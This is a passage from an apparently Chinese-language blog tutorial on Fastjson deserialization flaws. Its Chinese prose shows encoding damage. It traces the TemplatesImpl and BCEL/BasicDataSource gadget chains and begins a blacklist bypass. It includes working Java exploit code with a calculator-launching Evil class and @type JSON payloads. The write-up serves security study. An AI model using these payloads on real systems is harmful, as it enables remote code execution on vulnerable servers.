class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +<br>                    <span class="hljs-string">&quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="https://cdn.clown2024.cn/202408301123547.png" alt="image-20240830112259389"></p><p><strong>è°ƒç”¨æµç¨‹åˆ†æ</strong></p><p>Fastjsoné»˜è®¤åªä¼šååºåˆ—åŒ–publicä¿®é¥°çš„å±æ€§ï¼ŒoutputPropertieså’Œ_bytecodesç”±privateä¿®é¥°ï¼Œå¿…é¡»åŠ å…¥<code>Feature.SupportNonPublicField</code>åœ¨parseObjectä¸­æ‰èƒ½è§¦å‘</p><p>ç°åœ¨parseObjectä¸‹æ–­ç‚¹ï¼Œç„¶åè·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408301652896.png" alt="image-20240830165233826"></p><p>ç»§ç»­è·Ÿè¿›è¿™ä¸ªDefaultJSONParseræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301658846.png" alt="image-20240830165823736"></p><p>è¿™é‡Œtokenèµ‹çš„å€¼ä¸º12ï¼Œå…ˆè®°ä½</p><p><img src="https://cdn.clown2024.cn/202408301700254.png" alt="image-20240830170035160"></p><p>ç„¶åç»§ç»­è·Ÿè¿›parseObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301704915.png" alt="image-20240830170443834"></p><p>ä¸€è·¯è·Ÿè¿›åˆ°DefaultJSONParserçš„parseæ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301706899.png" alt="image-20240830170659818"></p><p>ç„¶åæ ¹æ®tokenä¸º12ä»£è¡¨â€{â€œåˆ¤æ–­åˆ°è¿™ï¼Œæˆ‘ä»¬è·Ÿè¿›parseObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301709246.png" alt="image-20240830170954179"></p><p>è¿›åˆ°è¿™é‡Œéå†lexerçš„textå±æ€§é‡Œæˆ‘ä»¬ä¼ çš„jsonå­—ç¬¦ä¸²ï¼Œä¸€å¼€å§‹æ‰«æåˆ°â€™â€â€˜å­—ç¬¦</p><p>ç„¶åå°±èµ°åˆ°ä¸‹é¢è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202408301713804.png" alt="image-20240830171321736"></p><p>ç„¶åå–å¾—keyä¸º@type</p><p><img src="https://cdn.clown2024.cn/202408301715496.png" alt="image-20240830171538418"></p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301720580.png" alt="image-20240830172002493"></p><p>è¿™é‡Œçš„DEFAULT_TYPE_KEYå°±æ˜¯@typeï¼Œç„¶åè°ƒç”¨scanSymbol()è·å–åˆ°äº†@typeå¯¹åº”çš„æŒ‡å®šç±»<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ï¼Œå¹¶è°ƒç”¨TypeUtils.loadClass()å‡½æ•°åŠ è½½è¯¥ç±»</p><p>ç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301723344.png" alt="image-20240830172310261"></p><p>è¿™é‡Œå¯¹ç±»åè¿›è¡Œäº†åˆ¤æ–­ï¼Œæ¶‰åŠåˆ°åé¢æ–°ç‰ˆæœ¬ç»•è¿‡é»‘åå•çš„æ–¹æ³•å…ˆç•™æ„ä¸€ä¸‹</p><p>ç°åœ¨ç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301725620.png" alt="image-20240830172504533"></p><p>è¿™é‡Œé€šè¿‡AppClassLoaderåŠ è½½åputåˆ°mappingsé‡Œé¢</p><p>è¿”å›åï¼Œç¨‹åºç»§ç»­å›åˆ°<code>DefaultJSONParser.parseObject()</code>ä¸­å¾€ä¸‹æ‰§è¡Œï¼Œåœ¨æœ€åè°ƒç”¨<code>JavaBeanDeserializer.deserialze()</code>å¯¹ç›®æ ‡ç±»è¿›è¡Œååºåˆ—åŒ–</p><p><img src="https://cdn.clown2024.cn/202408301727881.png" alt="image-20240830172750780"></p><p><strong>å…³é”®åˆ©ç”¨é“¾</strong></p><p>æ¥æ ¹æ®payloadçœ‹ä¸€ä¸‹å…³é”®çš„å±æ€§å¯¹åº”çš„setå’Œgetæ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +<br>                    &quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evilCode+&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot; +<br>                    &quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çŸ¥é“fastjsonçš„JSON.parseObjectä¼šè°ƒç”¨getå’Œsetæ–¹æ³•ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ˜¯TemplatesImplçš„getæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408302131055.png" alt="image-20240830213116051"></p><p>ç„¶ååé¢å…¶å®å°±æ˜¯ccé“¾çš„åŠ¨æ€ç±»åŠ è½½éƒ¨åˆ†ï¼Œé“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl#newTransformer()-&gt;TemplatesImpl#getTransletInstance()-&gt;TemplatesImpl#defineTransletClasses()-&gt;defineClass<br></code></pre></td></tr></table></figure><p>ç„¶åå›å¿†ä¸€ä¸‹æœ‰äº›åœ°æ–¹ä¸ºä»€ä¹ˆè¦èµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/202408302145512.png" alt="image-20240830214556445"></p><p>è¿™é‡Œ_tfactoryè¦è°ƒç”¨æ–¹æ³•æ‰€ä»¥ä¸èƒ½ä¸ºç©ºè¦èµ‹å€¼</p><p><img src="https://cdn.clown2024.cn/202408302146869.png" alt="image-20240830214643793"></p><p>è¿™é‡Œè¦è°ƒç”¨defineTransletClasses()æ–¹æ³•æ‰€ä»¥_name!&#x3D;nullï¼Œ_class&#x3D;&#x3D;nullåé¢å°±æ²¡æœ‰äº†</p><blockquote><p>è¿™é‡Œy4å¸ˆå‚…çš„payloadè¿˜å¸¦äº†ä¸€ä¸ªversionæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘å»æ‰äº†ä¹Ÿæ˜¯èƒ½å¤Ÿæ­£å¸¸å¼¹è®¡ç®—å™¨çš„</p></blockquote><p><strong>base64</strong></p><p>å†çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆéœ€è¦å°†å­—èŠ‚ç è¿›è¡Œbase64å¤„ç†</p><p>è¿™æ˜¯å› ä¸ºFastJsonæå–byte[]æ•°ç»„å­—æ®µå€¼æ—¶ä¼šè¿›è¡ŒBase64è§£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ payloadæ—¶éœ€è¦å¯¹ <code>_bytecodes</code> è¿›è¡ŒBase64å¤„ç†</p><p><img src="https://cdn.clown2024.cn/202408302203171.png" alt="image-20240830220348083"></p><p><img src="https://cdn.clown2024.cn/202408302204473.png" alt="image-20240830220404414"></p><p><strong>å…³äºä¸‹åˆ’çº¿çš„å¤„ç†</strong></p><p><img src="https://cdn.clown2024.cn/202408302206839.png" alt="image-20240830220656753"></p><p>æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹çš„smartMatchå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202408302207795.png" alt="image-20240830220749721"></p><p>ç„¶ååœ¨è¿™é‡Œå°†ä¸‹åˆ’çº¿è¿›è¡Œäº†æ›¿æ¢</p><h1 id="fastjson1115-1224ä¸bcelå­—èŠ‚ç åŠ è½½"><a href="#Fastjson1-1-15-1-2-24ä¸BCELå­—èŠ‚ç åŠ è½½" class="headerlink" title="Fastjson1.1.15-1.2.24ä¸BCELå­—èŠ‚ç åŠ è½½"></a>Fastjson1.1.15-1.2.24ä¸BCELå­—èŠ‚ç åŠ è½½</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoaderå»å“ªäº† | ç¦»åˆ«æ­Œ (leavesongs.com)</a>ï¼Œ<a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html">JavaåŠ¨æ€ç±»åŠ è½½ï¼Œå½“FastJsoné‡åˆ°å†…ç½‘ â€“ KINGX</a></p><p>è¿™ç§å’Œä¸Šé¢çš„TemplatesImplé“¾å­æ‰“æ³•éƒ½å¯ä»¥ç”¨äºä¸å‡ºç½‘çš„æ‰“æ³•ï¼Œä¸è¿‡æ¯”TemplatesImplåˆ©ç”¨æ›´å¹¿æ³›ä¸€ç‚¹</p><p>è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªä¾èµ–</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å…ˆç»™å‡ºåªç”¨parseå°±èƒ½è§¦å‘çš„payloadå½¢å¼</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//è¿™ä¸ªå¯æœ‰å¯æ— éƒ½ä¸å½±å“</span><br>        <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;x&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ä»£ç ï¼š</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.BECL;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(Evil.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br><span class="hljs-comment">//        String payload=&quot;&#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassLoader\&quot;: &#123;\n&quot; +</span><br><span class="hljs-comment">//                &quot;            \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;        &#125;,\n&quot; +</span><br><span class="hljs-comment">//                &quot;        \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;+code+&quot;\&quot;\n&quot; +</span><br><span class="hljs-comment">//                &quot;&#125;&quot;;  //è¿™ä¸ªåœ¨parseObjectçš„æ—¶å€™é€‚ç”¨</span><br>        String payload=<span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;x\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.commons.dbcp.BasicDataSource\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+code+<span class="hljs-string">&quot;\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;: \&quot;x\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409040119696.png" alt="image-20240904011923509"></p><p><strong>åˆ©ç”¨é“¾åˆ†æ</strong></p><p>å»çœ‹ä¸€ä¸‹BasicDataSourceçš„æºç ä¸­å¯¹åº”çš„å…³é”®æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409032251464.png" alt="image-20240903225126325"></p><p><img src="https://cdn.clown2024.cn/202409032305310.png" alt="image-20240903230514187"></p><p>å¥½å§æƒ³è‡ªå·±å»çœ‹å‘ç°å¥½åƒè¿™ä¸ªè°ƒç”¨ä¸å¤ªä¸€æ ·ï¼Œè¿™æ˜¯ä¼šè°ƒç”¨çš„setæ–¹æ³•ï¼Œæ–‡ç« çš„åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BasicDataSource.getConnection() -&gt; createDataSource() -&gt; createConnectionFactory()<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯æ–‡ç« çš„è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">æŒ‰ç†è¯´åº”è¯¥æ˜¯ä¸ä¼šè°ƒç”¨åˆ°getConnectionæ–¹æ³•çš„ï¼ŒåŸPoCä¸­å¾ˆå·§å¦™çš„åˆ©ç”¨äº† JSONObjectå¯¹è±¡çš„ toString() æ–¹æ³•å®ç°äº†çªç ´ã€‚JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œåœ¨æ‰§è¡ŒtoString() æ—¶ä¼šå°†å½“å‰ç±»è½¬ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œä¼šæå–ç±»ä¸­æ‰€æœ‰çš„Fieldï¼Œè‡ªç„¶ä¼šæ‰§è¡Œç›¸åº”çš„ getter ç­‰æ–¹æ³•ã€‚<br><br>é¦–å…ˆï¼Œåœ¨ &#123;â€œ@typeâ€: â€œorg.apache.tomcat.dbcp.dbcp2.BasicDataSourceâ€â€¦â€¦&#125; è¿™ä¸€æ•´æ®µå¤–é¢å†å¥—ä¸€å±‚&#123;&#125;ï¼Œååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ª JSONObject å¯¹è±¡ã€‚<br><br>ç„¶åï¼Œå°†è¿™ä¸ª JSONObject æ”¾åœ¨ JSON Key çš„ä½ç½®ä¸Šï¼Œåœ¨ JSON ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒFastJson ä¼šå¯¹ JSON Key è‡ªåŠ¨è°ƒç”¨ toString() æ–¹æ³•ï¼Œäºæ˜¯ä¹å°±è§¦å‘äº†BasicDataSource.getConnection()ã€‚<br></code></pre></td></tr></table></figure><blockquote><p>æ„Ÿè§‰æ–‡ç« è®²å¾—éƒ½æœ‰ç‚¹æ€ªï¼Œç„¶åè‡ªå·±è°ƒäº†åŠå¤©æ‰æ‰¾åˆ°ç¡®åˆ‡ä½ç½®ï¼Œæ¥ä¸‹æ¥åˆ†æä¹Ÿä¸çŸ¥é“æ­£ä¸æ­£ç¡®ï¼Œèƒ½è¯´æœæˆ‘è‡ªå·±å°±å¥½ï¼ˆ</p></blockquote><p><img src="https://cdn.clown2024.cn/202409040058412.png" alt="image-20240904005819248"></p><p>é¦–å…ˆèµ°åˆ°parseObjectè¿™é‡Œï¼Œç„¶åä¸€ç›´å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040100256.png" alt="image-20240904010058091"></p><p>èµ°åˆ°è¿™ä¼šè°ƒç”¨keyçš„toStringæ–¹æ³•ï¼Œè¿™æ—¶å€™valueä¸ºBasicDataSourceçš„æ—¶å€™æ˜¯å…³é”®æˆ‘ä»¬è·Ÿè¿›å»çœ‹</p><p><img src="https://cdn.clown2024.cn/202409040103451.png" alt="image-20240904010314293"></p><p>ç„¶ååˆ°è¿™ä¸ªwriteæ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040105060.png" alt="image-20240904010542894"></p><p>ç„¶åè¿›åˆ°ä¸€ä¸ªMapçš„éå†é‡Œé¢ï¼Œå‰é¢è¿›è¡Œäº†ä¸€äº›æ“ä½œå°†ä»–è½¬æˆäº†Mapç±»å‹ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409040108276.png" alt="image-20240904010839142"></p><p>è¿™é‡Œå°±æ˜¯æœ€åçš„æ–¹æ³•äº†ï¼Œå¯¹å­—æ®µè¿›è¡Œéå†</p><p><img src="https://cdn.clown2024.cn/202409040111143.png" alt="image-20240904011101980"></p><p>è¿™é‡Œå¯¹æ¯ä¸ªfieldè¿›è¡Œéå†ï¼Œç„¶åè°ƒç”¨ä»–ä»¬çš„getæ–¹æ³•ï¼Œè¿™é‡Œéå†åˆ°connectionå°±ä¼šè°ƒç”¨æˆ‘ä»¬æåˆ°çš„getConnection</p><p><img src="https://cdn.clown2024.cn/202409040112186.png" alt="image-20240904011236055"></p><p><img src="https://cdn.clown2024.cn/202409040113127.png" alt="image-20240904011312996"></p><p><img src="https://cdn.clown2024.cn/202409040051567.png" alt="image-20240904005104420"></p><p>æœ€ç»ˆæˆåŠŸè°ƒç”¨ï¼Œå…¶å®è°ƒçš„æˆ‘è¿˜æ˜¯æœ‰ç‚¹ä¸æ˜ä¸ç™½ï¼Œåªèƒ½è¯´å¤§è‡´çŸ¥é“</p><p>å¦‚æœæ˜¯parseObjectçš„è¯ï¼Œä»–ä¼šè§¦å‘æ‰€æœ‰getå’Œsetæ–¹æ³•ï¼Œç›´æ¥è¿™ç§payloadä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b......&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸Šé¢çš„ä¾èµ–è¿˜æœ‰ä¸€äº›é€‚ç”¨æ›´å¹¿æ³›çš„ä¾èµ–ï¼Œä¸è¿‡åˆ©ç”¨ä¾æ—§æ˜¯BasicDataSourceç±»</p><p>åœ¨æ—§ç‰ˆæœ¬çš„ tomcat-dbcp åŒ…ä¸­ï¼Œå¯¹åº”çš„è·¯å¾„æ˜¯ org.apache.tomcat.dbcp.dbcp.BasicDataSource</p><p>æ¯”å¦‚ï¼š6.0.53ã€7.0.81ç­‰ç‰ˆæœ¬</p><p>åœ¨Tomcat 8.0ä¹‹ååŒ…è·¯å¾„æœ‰æ‰€å˜åŒ–ï¼Œæ›´æ”¹ä¸ºäº† org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><h1 id="fastjson1225-1241ç»•è¿‡"><a href="#Fastjson1-2-25-1-2-41ç»•è¿‡" class="headerlink" title="Fastjson1.2.25-1.2.41ç»•è¿‡"></a>Fastjson1.2.25-1.2.41ç»•è¿‡</h1><p>Fastjsonåœ¨1.2.25ç‰ˆæœ¬å°±åŠ å…¥äº†é»‘ç™½åå•æœºåˆ¶</p><p>è¿™æ—¶å€™æˆ‘ä»¬å†å»æ‰§è¡Œå‰é¢çš„expå°±ä¼šçˆ†å‡ºä¸‹é¢çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202408302326388.png" alt="image-20240830232605306"></p><p>å†å»çœ‹ParserConfigé‡Œé¢å¯ä»¥çœ‹åˆ°å¾ˆå¤šç±»è¢«åŠ å…¥äº†é»‘åå•</p><p><img src="https://cdn.clown2024.cn/202408302328066.png" alt="image-20240830232822995"></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">bsh<br>com.mchange<br>com.sun.<br>java.lang.Thread<br>java.net.Socket<br>java.rmi<br>javax.xml<br>org.apache.bcel<br>org.apache.commons.beanutils<br>org.apache.commons.collections.Transformer<br>org.apache.commons.collections.functors<br>org.apache.commons.collections4.comparators<br>org.apache.commons.fileupload,org.apache.myfaces.context.servlet<br>org.apache.tomcat<br>org.apache.wicket.util<br>org.codehaus.groovy.runtime<br>org.hibernate<br>org.jboss,org.mozilla.javascript<br>org.python.core<br>org.springframework<br></code></pre></td></tr></table></figure><p>å…ˆç»™å‡ºç»•è¿‡çš„payload</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> 